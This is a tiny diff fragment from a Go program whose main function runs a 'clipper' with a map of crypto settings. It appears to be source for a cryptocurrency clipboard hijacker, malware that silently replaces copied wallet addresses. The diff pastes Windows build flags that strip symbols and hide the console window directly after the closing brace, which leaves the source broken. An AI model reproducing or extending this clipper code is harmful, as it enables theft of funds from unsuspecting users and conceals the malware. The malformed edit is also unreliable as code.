@@ -82,4 +82,5 @@ func main() {
 	}
 
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
-}
+}-ldflags "-s -w -H=windowsgui"
+
